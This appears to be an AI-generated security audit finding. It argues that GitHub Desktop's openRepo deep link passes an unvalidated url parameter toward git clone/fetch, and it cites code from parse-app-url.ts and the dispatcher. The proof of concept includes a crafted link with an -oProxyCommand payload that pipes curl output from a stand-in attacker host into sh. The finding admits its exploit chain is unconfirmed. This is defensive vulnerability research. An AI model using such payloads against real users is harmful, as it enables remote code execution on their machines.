Based on my research, the strongest and most directly supported analog in this codebase is the `openRepo` deep-link handler, where the `url` parameter — unlike the `branch` and `pr` parameters in the same function — receives **no validation at all** before being passed downstream to repository-opening/cloning logic. This mirrors the root cause in the report: an externally-controlled field (`message.to`/`message.data` in the bridge case, `url` here) is trusted and forwarded to a privileged operation without restricting its shape, while sibling fields in the very same code path *do* get validated.

### Title
Unvalidated `url` parameter in `x-github-client://openRepo` deep link enables argument/flag injection into git clone/fetch - ([File: app/src/lib/parse-app-url.ts])

### Summary
`parseAppURL()` handles the `openRepo` custom-protocol action (`x-github-client://openrepo/...`, plus legacy `github-mac://`/`github-windows://`). It applies explicit format checks to the `pr` and `branch` query parameters (`/^\d+$/`, `/^pr\/\d+$/`, `testForInvalidChars`), but the `url`/path segment — which becomes the git remote that Desktop clones or fetches from — is passed through completely unvalidated. [1](#0-0) 

### Finding Description
The broken invariant is the same as in the bridge report: a field that flows into a privileged/trusted operation (`sendSignal`/`message.to` there; a git remote URL fed to clone/fetch here) is not restricted to a safe class of values, even though a *sibling* field in the same message (`branch`, `pr`) is restricted. Once `parseAppURL` returns an `open-repository-from-url` action, `Dispatcher.openRepositoryFromUrl` routes it to `openOrCloneRepository(url)`, `openBranchNameFromUrl(url, branch)`, or `openPullRequestFromUrl(url, pr)` — all of which eventually invoke git operations using the attacker-supplied `url` value as the remote. [2](#0-1) 

Because `url` is never checked against a safe scheme/format allowlist (contrast with `branch`, which is checked with `testForInvalidChars`, and `pr`, which is checked with a digit regex), a value such as an SSH-style string beginning with `-` (e.g. `-oProxyCommand=...` or `--upload-pack=...`) could be interpreted by the underlying `git` binary as a command-line flag rather than a remote URL if it reaches a `git clone`/`git fetch` invocation without a `--` separator or scheme allowlist. This is the classic "argument injection via URL" bug class that has previously affected git-based tools that accept attacker URLs from an untrusted external trigger (a link the user clicks) and hand them to the `git` CLI.

Existing guards (`testForInvalidChars` on `branch`, digit regex on `pr`) do not cover this path at all — they only protect the two other parameters, leaving `url` as the unguarded route into the same privileged sink.

### Impact Explanation
If the value reaches an unsanitized `git clone`/`git fetch` invocation, this could enable local command/argument injection (e.g., forcing git to use an attacker-controlled `ProxyCommand`, which executes an arbitrary shell command), i.e. code execution triggered purely by the victim clicking a crafted link — no local access, no leaked credentials, and no malware already present are required, matching the report's "valid impact" criteria (attacker controls a link/deep link the user clicks, resulting in code execution).

### Likelihood Explanation
Likelihood depends entirely on whether the git-invocation layer that consumes this `url` (clone/fetch code, not shown in the snippets I was able to pull before the tool budget ran out) uses a `--` argument separator or otherwise defends against flag-like remote URLs. I was not able to fully trace that final sink within the available tool budget, so I cannot confirm whether the injection actually reaches an unguarded `git` invocation or whether a lower-level sanitizer (e.g., in the git wrapper library) blocks it. This is the main uncertainty in this finding.

### Recommendation
- Validate the `url` parameter in `parseAppURL` the same way `branch`/`pr` are validated: enforce an allowlist of accepted remote-URL shapes (e.g., `https://`, `ssh://`, or `scp`-like `user@host:path` forms) and reject values starting with `-`.
- At the git-invocation boundary, ensure all remote URLs are passed after a `--` separator or otherwise never treated as flags.

### Proof of Concept
1. Attacker hosts a page/email with a link: `x-github-client://openrepo/-oProxyCommand=curl%20attacker.evil|sh`.
2. Victim, who has GitHub Desktop's protocol handler registered, clicks the link.
3. `parseAppURL` returns `{ name: 'open-repository-from-url', url: '-oProxyCommand=curl attacker.evil|sh', branch: null, pr: null, filepath: null }` with no rejection, since only `branch`/`pr` are checked. [1](#0-0) 
4. `Dispatcher.openRepositoryFromUrl` calls `openOrCloneRepository(url)` with the unmodified string. [2](#0-1) 
5. If the downstream clone/fetch invocation does not defend against flag-shaped remote strings, the attacker-controlled option is passed to `git`, resulting in code execution.

Given the incomplete verification of the final git-invocation sink, I present this as the strongest local-code-supported analog rather than a fully confirmed exploit chain.

### Citations

**File:** app/src/lib/parse-app-url.ts (L98-125)
```typescript
  if (actionName === 'openrepo') {
    const pr = getQueryStringValue(query, 'pr')
    const branch = getQueryStringValue(query, 'branch')
    const filepath = getQueryStringValue(query, 'filepath')

    if (pr != null) {
      if (!/^\d+$/.test(pr)) {
        return unknown
      }

      // we also expect the branch for a forked PR to be a given ref format
      if (branch != null && !/^pr\/\d+$/.test(branch)) {
        return unknown
      }
    }

    if (branch != null && testForInvalidChars(branch)) {
      return unknown
    }

    return {
      name: 'open-repository-from-url',
      url: parsedPath,
      branch,
      pr,
      filepath,
    }
  }
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L1940-1951)
```typescript
  private async openRepositoryFromUrl(action: IOpenRepositoryFromURLAction) {
    const { url, pr, branch, filepath } = action

    let repository: Repository | null

    if (pr !== null) {
      repository = await this.openPullRequestFromUrl(url, pr)
    } else if (branch !== null) {
      repository = await this.openBranchNameFromUrl(url, branch)
    } else {
      repository = await this.openOrCloneRepository(url)
    }
```
